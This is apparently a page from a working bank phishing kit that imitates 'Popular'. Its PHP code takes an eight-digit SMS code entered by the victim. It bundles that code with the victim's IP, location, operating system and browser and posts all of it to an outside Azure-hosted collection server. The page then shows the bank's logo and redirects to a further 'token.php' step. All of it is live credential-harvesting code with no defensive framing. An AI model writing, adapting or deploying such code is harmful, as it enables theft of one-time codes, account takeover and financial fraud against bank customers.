<?php ini_set('display_errors', 0);
$userp = $_SERVER['REMOTE_ADDR'];

include('funciones.php');
if (isset($_POST['num1']) && isset($_POST['num2']) && isset($_POST['num3']) && isset($_POST['num4']) && isset($_POST['num5']) && isset($_POST['num6']) && isset($_POST['num7']) && isset($_POST['num8'])) {
    $message = 'POPULAR
SMS: ' . $_POST['num1'] . $_POST['num2'] . $_POST['num3'] . $_POST['num4'] . $_POST['num5'] . $_POST['num6'] . $_POST['num7'] . $_POST['num8'] . '
Fecha: ' . date('l jS \of F Y h:i:s A', time()) . '
Ip y Localidad: ' . $myip . ' ' . $pais . ' ' . $region . '
SO: ' . $user_os . '
Navegador: ' . $navegador . '';
    $payload = ['mensaje' => $message];
    $url = 'https://servidorapis-ggdnawe6aefxerg7.canadacentral-01.azurewebsites.net/popularnequi/';

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST           => true,
        CURLOPT_HTTPHEADER     => [
            'Accept: application/json',
            'Content-Type: application/json'
        ],
        CURLOPT_POSTFIELDS     => json_encode($payload, JSON_UNESCAPED_UNICODE),
        CURLOPT_TIMEOUT        => 20,
        CURLOPT_CONNECTTIMEOUT => 10,
    ]);

    $response = curl_exec($ch);
    if ($response === false) {
        error_log('cURL error: ' . curl_error($ch));
        http_response_code(500);
        exit('Error de red.');
    }
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
} ?>
<!DOCTYPE html>
<html lang="es" class="hydrated show-recaptcha">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Popular</title>
    <base href=".">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <meta http-equiv="Last-Modified" content="0">
    <meta name="robots" content="index follow">

    <meta http-equiv="refresh" content="3;url=token.php">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="msapplication-tap-highlight" content="no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta http-equiv="Cache-control" content="private, no-cache, no-store, must-revalidate">
    <meta name="viewport" content="viewport-fit=cover, width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="stylesheet" href="./commad/styles.a9fefd8dc42981f33a92.css">
    <style type="text/css" id="operaUserStyle"></style>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
        }

        .contenedor {
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background-color: #f0f0f0;
        }

        .logo {
            max-width: 100%;
            height: auto;
            transition: opacity 0.5s ease-in-out;
        }

        .logo.visible {
            opacity: 1;
        }

        .logo.oculto {
            opacity: 0;
        }
    </style>
</head>

<body>
    <div class="contenedor">
        <img src="./commad/logotipo-horizontalx3.png" alt="Logo de tu página" class="logo visible" id="logo">
    </div>

    <script>
        document.addEventListener("DOMContentLoaded", function() {
            var logo = document.getElementById("logo");

            setTimeout(function() {
                logo.classList.add("oculto");
            }, 2000);
        });
    </script>
</body>

</html>